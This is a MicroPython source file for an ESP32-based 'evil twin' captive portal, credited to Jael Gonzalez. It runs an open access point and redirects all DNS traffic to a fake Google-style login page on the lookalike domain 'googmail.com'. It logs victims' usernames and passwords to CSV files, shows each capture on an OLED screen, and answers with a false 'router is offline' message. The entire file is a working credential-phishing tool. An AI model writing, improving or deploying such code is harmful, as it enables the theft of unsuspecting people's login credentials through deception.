import _thread
import json
import os
import time
from machine import Pin, I2C
import ssd1306
from phew import server, access_point
from phew.dns import run_catchall
from phew.logging import disable_logging_types, LOG_ALL

# Disable phew logging
# disable_logging_types(LOG_ALL)

# Project Info
VERSION = 1.0
ARTHUR = 'Jael Gonzalez'
GITHUB = ''

# Hardware setup
#Change scl and sda pins to match hardware
i2c = I2C(0, scl=Pin(22), sda=Pin(21))
oled_width = 128
oled_height = 64
oled = ssd1306.SSD1306_I2C(oled_width, oled_height, i2c)
    
# Variables
start_time = time.time()
direction = 1
count = 0
captured_time = 0
WAITING = True
last_capture = {}
amount_of_captures = 0
DOMAIN = 'googmail.com'
amount_of_previous_capture_files = len(os.listdir("captures")) + 1

# Loading animations and files
with open("animations/cat_sleeping.json", "r") as cat_sleeping_file:
    cat_sleeping_animation = json.load(cat_sleeping_file)

with open("animations/cat_captures.json", "r") as cat_captured_file:
    cat_captured_animation = json.load(cat_captured_file)

#Both animatiosn have the same amount of frames
FRAMES_NUM = len(cat_sleeping_animation)


#Create new file each session
with open(f"captures/capture_{amount_of_previous_capture_files}.csv", "w") as captures_file:
    print("File made")
    captures_file.write("username,password,website\n")


'''
The html file is being preloaded and saved as Response.
That way, it doesn't have to be opened everytime it is
server (when using render_template)
'''
with open("templates/goog.html", "r") as html_file:
    LOGIN_RESPONSE = server.Response(status=200, headers={"Content-Type": "text/html"}, body=html_file.read())

# Default response when someone logs in
SUCCESS_RESPONSE = server.Response(status=200, headers={"Content-Type": "text/html"}, body="Router is offline right now, try again another time.")

# Animation function
def animate():
    global VERSION, oled, cat_sleeping_animation, cat_captured_animation, direction, count, FRAMES_NUM, captured_time, WAITING, last_capture, amount_of_captures, start_time, amount_of_previous_capture_files

    while True:
        oled.fill(1)
        
        #Top bar
        oled.rect(0, 0, 128, 15, 0, True)
        oled.text(f"v{VERSION}",0,55,0)
        
        #Executed while waiting for a capture
        if WAITING:
            
            #Calculate uptime and display it in hh:mm:ss
            current_time = time.time() - start_time  
            hours = int(current_time // 3600)
            minutes = int((current_time % 3600) // 60)
            seconds = int(current_time % 60)

            oled.text(f"({amount_of_captures:02})", 0, 5, 1)
            oled.text(f"UP{hours:02d}:{minutes:02d}:{seconds:02d}", 45, 5, 1)
            oled.text(f"Waiting{'.' * (count + 1)}", 0, 17, 0)
            frame_content = cat_sleeping_animation[count]
            
        #Executed when a capture is made
        else:
            frame_content = cat_captured_animation[count]
            oled.text(f"({amount_of_captures:02}) {last_capture['website']}", 0, 5, 1)
            oled.text(f"[{amount_of_previous_capture_files}]", 128-(len(str(amount_of_previous_capture_files))+2)*8 - 2,55,0)
            
            #Formatting to show a '-' at the end if text don't fit
            if len(last_capture['username']) > 16:
                formatted_username = last_capture['username'][:15] + '-'
            else:
                formatted_username = last_capture['username'][:15]

            if len(last_capture['password']) > 16:
                formatted_password = last_capture['password'][:15] + '-'
            else:
                formatted_password = last_capture['password']

            oled.text(formatted_username, 0, 19, 0)
            oled.text(formatted_password, 0, 28, 0)
            
            #Display the capture for 5 seconds
            if time.time() - captured_time > 5:
                WAITING = True
                last_capture = {}
                
        #Iterate trough grid and show pixels accordingly
        for i in range(len(frame_content)):
            if frame_content[i] == []:
                continue

            for x_value in frame_content[i]:
                oled.pixel(x_value, i, 0)

        time.sleep(0.5)
        oled.show()

        count = (count + direction) % FRAMES_NUM
        
        #Count that swtiches direction without repeating the last count
        #i.e 0,1,2,1,0,1,2...
        if count == 0 and direction == -1:
            direction = 1
        elif count == FRAMES_NUM - 1 and direction == 1:
            direction = -1

#################SERVER CODE#################
# Setting up server and access point
ACCESS_POINT_ESSID = "WifiPortal"
PASSWORD = None

wlan_AP_IF = access_point(ACCESS_POINT_ESSID, PASSWORD)

@server.route("/login", methods=["GET", "POST"])
def login_page(request):
    global captured_time, WAITING, last_capture, amount_of_captures, DOMAIN
           
    if request.method == "GET":
        return LOGIN_RESPONSE
    else:
        if request.form:
            username = request.form['username']
            password = request.form['password']
            website = request.form['website']

            with open(f"captures/capture_{amount_of_previous_capture_files}.csv", "a") as captures_file:
                captures_file.write(f"{username},{password},{website}\n")

        captured_time = time.time()
        last_capture = request.form
        amount_of_captures += 1
        WAITING = False

        return SUCCESS_RESPONSE

#DNS catchall to redirect every request
@server.catchall()
def catchall(request):
    return server.redirect("http://" + DOMAIN + "/login")

# Running threads and server
_thread.start_new_thread(animate, [])
run_catchall(wlan_AP_IF.ifconfig()[0])
server.run()

